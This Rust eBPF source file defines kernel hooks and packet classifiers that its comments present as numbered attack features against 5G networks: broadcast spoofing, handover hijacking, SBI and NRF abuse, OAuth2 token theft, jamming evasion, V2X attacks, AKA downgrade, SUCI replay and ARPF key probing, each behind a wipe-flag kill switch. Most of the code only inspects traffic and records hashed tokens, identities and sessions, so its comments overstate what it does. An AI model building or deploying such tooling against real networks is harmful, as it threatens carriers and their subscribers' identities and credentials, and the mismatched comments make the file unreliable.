use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{classifier, kprobe, xdp},
    programs::{ProbeContext, TcContext, XdpContext},
};
use common::{
    EventHeader, HandoverCtx, MimoBeamState, SbiSessionState, EVENT_AKA_DOWNGRADE,
    EVENT_ARPF_PROBE, EVENT_HANDOVER_HIJACK, EVENT_JAMMING_EVASION, EVENT_MIMO_FINGERPRINT,
    EVENT_NRF_ABUSE, EVENT_OAUTH2_THEFT, EVENT_PBCH_SIB_SPOOF, EVENT_RRC_MEAS_MANIPULATE,
    EVENT_SBI_EXPLOIT, EVENT_SIDELINK_EXPLOIT, EVENT_SUCI_REPLAY,
};

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const TCP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const SBI_HTTP2_PORT: u16 = 7777;
const NRF_PORT: u16 = 7778;
const AUSF_PORT: u16 = 7779;
const UDM_PORT: u16 = 7780;
const PC5_PORT: u16 = 38472;
const PFCP_PORT: u16 = 8805;

fn fnv_hash_u64(a: u64, b: u64) -> u64 {
    let mut h: u64 = 0xcbf29ce484222325;
    h ^= a;
    h = h.wrapping_mul(0x100000001b3);
    h ^= b;
    h = h.wrapping_mul(0x100000001b3);
    h
}

// ──────────────────────────────────────────────
// FEATURE 109: PBCH/SIB Spoofing
// Injects fake system information into broadcast channel
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_pbch_sib_spoof(ctx: ProbeContext) -> u32 {
    try_pbch_sib_spoof(&ctx).unwrap_or(0)
}

fn try_pbch_sib_spoof(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;

    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let first_bytes: [u8; 4] = unsafe {
        bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 4]).map_err(|e| e as i64)?
    };

    // MIB (PBCH) magic: 0xA0 prefix for broadcast injection
    if first_bytes[0] == 0xA0 || first_bytes[0] == 0xB0 {
        let cell_id = u32::from_be_bytes([0, first_bytes[1], first_bytes[2], first_bytes[3]]);
        let event = EventHeader {
            event_type: EVENT_PBCH_SIB_SPOOF,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: cell_id as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 110: RRC Measurement Report Manipulation
// Tampers with measurement reports to influence handover decisions
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_rrc_meas_manipulate(ctx: ProbeContext) -> u32 {
    try_rrc_meas_manipulate(&ctx).unwrap_or(0)
}

fn try_rrc_meas_manipulate(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe {
        bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8]).map_err(|e| e as i64)?
    };

    // RRC MeasurementReport: message type 0x08 in UL-DCCH
    if hdr[0] == 0x08 || hdr[0] == 0x0A {
        let pci = u16::from_be_bytes([hdr[2], hdr[3]]);
        let rsrp = i16::from_be_bytes([hdr[4], hdr[5]]);

        let ho_ctx = HandoverCtx {
            source_pci: 0,
            target_pci: pci,
            earfcn: u32::from_be_bytes([0, 0, hdr[6], hdr[7]]),
            meas_rsrp: rsrp,
            meas_rsrq: 0,
            event_type: 0x110,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = unsafe { HANDOVER_CTX.insert(&(pci as u32), &ho_ctx, 0) };

        let event = EventHeader {
            event_type: EVENT_RRC_MEAS_MANIPULATE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: pci as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 111: Handover Hijacking via Neighbor Cell Injection
// Forces UE handover to attacker-controlled cell
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_handover_hijack(ctx: TcContext) -> i32 {
    try_handover_hijack(&ctx).unwrap_or_default()
}

fn try_handover_hijack(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 16) as u32 {
        return Ok(0);
    }

    let data = unsafe { ctx.data() };
    let data_end = unsafe { ctx.data_end() };
    if data + ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 8 > data_end {
        return Ok(0);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 6 {
        return Ok(0);
    }

    let tcp_hdr = ip_hdr + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((tcp_hdr + 2) as *const u16)) };

    // NGAP port (38412) or X2AP port — handover signaling
    if dst_port == 38412 || dst_port == 36422 {
        let payload = tcp_hdr + TCP_HDR_LEN;
        if payload + 8 > data_end {
            return Ok(0);
        }
        let proc_code = unsafe { *((payload + 2) as *const u8) };
        // HandoverRequired=0, HandoverCommand=1, HandoverPreparation
        if proc_code <= 2 {
            let src_ip = unsafe { u32::from_be(*((ip_hdr + 12) as *const u32)) };
            let event = EventHeader {
                event_type: EVENT_HANDOVER_HIJACK,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: fnv_hash_u64(src_ip as u64, dst_port as u64),
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 112: HTTP/2 SBI Exploitation
// Exploits 5G Service-Based Interface between NFs
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_sbi_exploit(ctx: TcContext) -> i32 {
    try_sbi_exploit(&ctx).unwrap_or_default()
}

fn try_sbi_exploit(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 9) as u32 {
        return Ok(0);
    }

    let data = unsafe { ctx.data() };
    let data_end = unsafe { ctx.data_end() };
    if data + ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 9 > data_end {
        return Ok(0);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 6 {
        return Ok(0);
    }

    let tcp_hdr = ip_hdr + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((tcp_hdr + 2) as *const u16)) };

    if dst_port == SBI_HTTP2_PORT
        || dst_port == NRF_PORT
        || dst_port == AUSF_PORT
        || dst_port == UDM_PORT
    {
        let payload = tcp_hdr + TCP_HDR_LEN;
        // HTTP/2 magic prefix: "PRI * HTTP/2.0" or frame header
        let frame_type = unsafe { *((payload + 3) as *const u8) };
        let stream_id_raw = unsafe { u32::from_be(*((payload + 5) as *const u32)) };
        let stream_id = stream_id_raw & 0x7FFFFFFF;

        let src_ip = unsafe { u32::from_be(*((ip_hdr + 12) as *const u32)) };
        let dst_ip = unsafe { u32::from_be(*((ip_hdr + 16) as *const u32)) };
        let session_key = fnv_hash_u64(src_ip as u64, dst_ip as u64);

        let session = SbiSessionState {
            stream_id,
            method_hash: frame_type as u32,
            path_hash: session_key,
            nf_src: src_ip,
            nf_dst: dst_ip,
            token_hash: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = unsafe { SBI_SESSIONS.insert(&session_key, &session, 0) };

        let event = EventHeader {
            event_type: EVENT_SBI_EXPLOIT,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: session_key,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 113: NRF/AUSF/UDM API Abuse
// Exploits NF discovery/registration for unauthorized access
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_nrf_abuse(ctx: TcContext) -> i32 {
    try_nrf_abuse(&ctx).unwrap_or_default()
}

fn try_nrf_abuse(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 12) as u32 {
        return Ok(0);
    }

    let data = unsafe { ctx.data() };
    let data_end = unsafe { ctx.data_end() };
    if data + ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 12 > data_end {
        return Ok(0);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 6 {
        return Ok(0);
    }

    let tcp_hdr = ip_hdr + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((tcp_hdr + 2) as *const u16)) };

    if dst_port == NRF_PORT {
        let payload = tcp_hdr + TCP_HDR_LEN;
        let frame_len = unsafe { u32::from_be(*((payload) as *const u32)) } >> 8;

        let src_ip = unsafe { u32::from_be(*((ip_hdr + 12) as *const u32)) };
        let nf_key = fnv_hash_u64(src_ip as u64, frame_len as u64);

        let event = EventHeader {
            event_type: EVENT_NRF_ABUSE,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: nf_key,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 114: OAuth2 Token Theft Between NFs
// Captures access tokens from NF-to-NF HTTP/2 communication
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_oauth2_theft(ctx: ProbeContext) -> u32 {
    try_oauth2_theft(&ctx).unwrap_or(0)
}

fn try_oauth2_theft(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let len: usize = ctx.arg::<usize>(2).ok_or(0i64)?;

    if len < 32 {
        return Ok(0);
    }

    let hdr: [u8; 16] = unsafe {
        bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 16]).map_err(|e| e as i64)?
    };

    // Look for "Bearer " or "access_token" patterns in HTTP/2 headers
    if (hdr[0] == b'B' && hdr[1] == b'e' && hdr[2] == b'a' && hdr[3] == b'r')
        || (hdr[0] == b'a' && hdr[1] == b'c' && hdr[2] == b'c' && hdr[3] == b'e')
    {
        let token_hash = fnv_hash_u64(
            u64::from_ne_bytes([
                hdr[0], hdr[1], hdr[2], hdr[3], hdr[4], hdr[5], hdr[6], hdr[7],
            ]),
            u64::from_ne_bytes([
                hdr[8], hdr[9], hdr[10], hdr[11], hdr[12], hdr[13], hdr[14], hdr[15],
            ]),
        );

        let expiry = unsafe { bpf_ktime_get_ns() } + 3_600_000_000_000; // 1 hour
        let _ = unsafe { OAUTH2_TOKENS.insert(&token_hash, &expiry, 0) };

        let event = EventHeader {
            event_type: EVENT_OAUTH2_THEFT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: token_hash,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 115: Jamming Detection Evasion
// Anti-detection waveform for uplink/downlink jamming
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_jamming_evasion(ctx: XdpContext) -> u32 {
    try_jamming_evasion(&ctx).unwrap_or(xdp_action::XDP_PASS)
}

fn try_jamming_evasion(ctx: &XdpContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(xdp_action::XDP_PASS);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();

    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 16 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 17 {
        return Ok(xdp_action::XDP_PASS);
    }

    let udp_hdr = ip_hdr + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((udp_hdr + 2) as *const u16)) };

    // IQ sample streams on custom SDR port range
    if dst_port >= 9000 && dst_port <= 9100 {
        let payload = udp_hdr + UDP_HDR_LEN;
        let sample_marker = unsafe { u32::from_be(*((payload) as *const u32)) };

        // Look for jam signal pattern (power spectral density spike)
        if sample_marker & 0xFF000000 == 0xAA000000 {
            let event = EventHeader {
                event_type: EVENT_JAMMING_EVASION,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: sample_marker as u64,
            };
            let _ = EVENTS.output(&event, 0);
            return Ok(xdp_action::XDP_DROP);
        }
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 116: MIMO Beamforming Fingerprinting
// Fingerprints cells via CSI-RS/SSB beam patterns
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_mimo_fingerprint(ctx: ProbeContext) -> u32 {
    try_mimo_fingerprint(&ctx).unwrap_or(0)
}

fn try_mimo_fingerprint(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 12] = unsafe {
        bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 12]).map_err(|e| e as i64)?
    };

    // CSI report indicator byte
    if hdr[0] == 0xC5 || hdr[0] == 0xC6 {
        let beam_id = u32::from_be_bytes([0, hdr[1], hdr[2], hdr[3]]);
        let ssb_index = hdr[4];
        let num_layers = hdr[5];

        let beam_state = MimoBeamState {
            beam_id,
            ssb_index,
            num_layers,
            _pad: [0; 2],
            precoder_hash: fnv_hash_u64(beam_id as u64, ssb_index as u64),
            csi_report_hash: fnv_hash_u64(
                u64::from_ne_bytes([
                    hdr[4], hdr[5], hdr[6], hdr[7], hdr[8], hdr[9], hdr[10], hdr[11],
                ]),
                beam_id as u64,
            ),
        };
        let _ = unsafe { MIMO_BEAMS.insert(&beam_id, &beam_state, 0) };

        let event = EventHeader {
            event_type: EVENT_MIMO_FINGERPRINT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: beam_id as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 117: Sidelink (PC5/V2X) Exploitation
// Attacks vehicle-to-everything communication on PC5 interface
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_sidelink_exploit(ctx: TcContext) -> i32 {
    try_sidelink_exploit(&ctx).unwrap_or_default()
}

fn try_sidelink_exploit(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 12) as u32 {
        return Ok(0);
    }

    let data = unsafe { ctx.data() };
    let data_end = unsafe { ctx.data_end() };
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 12 > data_end {
        return Ok(0);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 17 {
        return Ok(0);
    }

    let udp_hdr = ip_hdr + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((udp_hdr + 2) as *const u16)) };

    if dst_port == PC5_PORT {
        let payload = udp_hdr + UDP_HDR_LEN;
        let src_l2_id = unsafe { u32::from_be(*(payload as *const u32)) };
        let dst_l2_id = unsafe { u32::from_be(*((payload + 4) as *const u32)) };

        let event = EventHeader {
            event_type: EVENT_SIDELINK_EXPLOIT,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: fnv_hash_u64(src_l2_id as u64, dst_l2_id as u64),
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 118: 5G-AKA Protocol Downgrade to EAP-AKA'
// Forces authentication downgrade from native 5G-AKA
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_aka_downgrade(ctx: ProbeContext) -> u32 {
    try_aka_downgrade(&ctx).unwrap_or(0)
}

fn try_aka_downgrade(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let len: usize = ctx.arg::<usize>(2).ok_or(0i64)?;

    if len < 48 {
        return Ok(0);
    }

    let hdr: [u8; 16] = unsafe {
        bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 16]).map_err(|e| e as i64)?
    };

    // AUSF authentication response — EAP-AKA' indicator
    // NAS 5GMM: Authentication Request type=0x56, EAP method=50 (EAP-AKA')
    if hdr[0] == 0x56 || (hdr[0] == 0x01 && hdr[4] == 50) {
        let suci_hash = fnv_hash_u64(
            u64::from_ne_bytes([
                hdr[0], hdr[1], hdr[2], hdr[3], hdr[4], hdr[5], hdr[6], hdr[7],
            ]),
            u64::from_ne_bytes([
                hdr[8], hdr[9], hdr[10], hdr[11], hdr[12], hdr[13], hdr[14], hdr[15],
            ]),
        );

        let event = EventHeader {
            event_type: EVENT_AKA_DOWNGRADE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: suci_hash,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 119: SUCI Replay Attack
// Replays captured SUCI values to track subscriber identity
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_suci_replay(ctx: ProbeContext) -> u32 {
    try_suci_replay(&ctx).unwrap_or(0)
}

fn try_suci_replay(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let len: usize = ctx.arg::<usize>(2).ok_or(0i64)?;

    if len < 32 {
        return Ok(0);
    }

    let hdr: [u8; 16] = unsafe {
        bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 16]).map_err(|e| e as i64)?
    };

    // SUCI structure: protection scheme 0x01 (ECIES profile A/B)
    if hdr[0] == 0x01 || hdr[0] == 0x02 {
        let suci_hash = fnv_hash_u64(
            u64::from_ne_bytes([
                hdr[0], hdr[1], hdr[2], hdr[3], hdr[4], hdr[5], hdr[6], hdr[7],
            ]),
            u64::from_ne_bytes([
                hdr[8], hdr[9], hdr[10], hdr[11], hdr[12], hdr[13], hdr[14], hdr[15],
            ]),
        );

        // Check if we already captured this SUCI — replay indicator
        if unsafe { AKA_AUTH_STATE.get(&suci_hash) }.is_some() {
            let event = EventHeader {
                event_type: EVENT_SUCI_REPLAY,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: suci_hash,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 120: ARPF Key Extraction via UDM Probing
// Probes ARPF (Authentication Repository) for home network keys
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_arpf_probe(ctx: ProbeContext) -> u32 {
    try_arpf_probe(&ctx).unwrap_or(0)
}

fn try_arpf_probe(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let len: usize = ctx.arg::<usize>(2).ok_or(0i64)?;

    if len < 64 {
        return Ok(0);
    }

    let hdr: [u8; 16] = unsafe {
        bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 16]).map_err(|e| e as i64)?
    };

    // UDM/ARPF interface: Nudm_UEAuthentication service
    // HTTP/2 path pattern for /nudm-ueau/v1/suci-0-*/security-information
    if hdr[0] == b'/' && hdr[1] == b'n' && hdr[2] == b'u' && hdr[3] == b'd' {
        let target_hash = fnv_hash_u64(
            u64::from_ne_bytes([
                hdr[4], hdr[5], hdr[6], hdr[7], hdr[8], hdr[9], hdr[10], hdr[11],
            ]),
            u64::from_ne_bytes([hdr[12], hdr[13], hdr[14], hdr[15], 0, 0, 0, 0]),
        );

        let event = EventHeader {
            event_type: EVENT_ARPF_PROBE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: target_hash,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
